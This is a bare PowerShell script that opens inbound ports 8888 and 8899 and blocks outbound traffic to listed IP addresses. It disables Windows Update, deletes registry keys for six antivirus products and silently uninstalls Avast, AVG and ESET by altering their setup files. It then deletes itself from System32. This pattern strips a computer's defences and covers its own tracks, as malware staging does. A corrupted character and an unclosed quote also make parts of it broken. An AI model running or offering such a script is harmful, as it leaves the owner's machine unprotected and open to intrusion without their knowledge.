New-NetFirewallRule -DisplayName 'My port' -Profile 'Private, Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8899, 8888
New-NetFirewallRule -DisplayName "Microsofts" -Direction Outbound �LocalPort Any -Protocol Any -Action Block -RemoteAddress 104.215.148.63, 104.106.113.241, 40.112.72.205, 104.106.107.210

sc.exe config wuauserv start=disabled
sc.exe stop wuauserv
stop-service -DisplayName "Windows Update"
get-service -DisplayName "Windows Update" | Set-Service -StartupType "Disabled"

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "TargetReleaseversion" /t REG_DWORD /d "1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "TargetReleaseversionInfo" /t REG_SZ /d "21H2"

reg delete "HKCU\Software\BitDefender"
reg delete "HKCU\Software\KasperskyLab"
reg delete "HKCU\Software\Avast Software"
reg delete "HKCU\Software\McAfee"
reg delete "HKCU\Software\AVG"
reg delete "HKCU\Software\Eset Security"

$stats_file = "C:\Program Files\Avast software\Avast\setup\Stats.ini"
(Get-Content $stats_file) | ForEach-Object { $_ -replace "\[Common\]", "[Common]`nSilentUninstallEnabled=1" } | Set-Content $stats_file
Start-Process -filepath "C:\Program Files\Avast software\Avast\setup\instup.exe" -argumentlist "/instop:uninstall /silent /wait"
pause

$stats_file = "C:\Program Files\AVG\Antivirus\setup\Stats.ini"
(Get-Content $stats_file) | ForEach-Object { $_ -replace "\[Common\]", "[Common]`nSilentUninstallEnabled=1" } | Set-Content $stats_file
Start-Process -filepath "C:\Program Files\AVG\Antivirus\setup\instup.exe" -argumentlist "/instop:uninstall /silent /wait"
pause

(Get-WmiObject -Class Win32_Product -Filter "Name='Eset Security'").Uninstall()
(Get-WmiObject -Class Win32_Product -Filter "Name='Avast software'").Uninstall()

Start-Sleep -s 5
Remove-Item -Path C:\Windows\System32\3ps.ps1 -Force
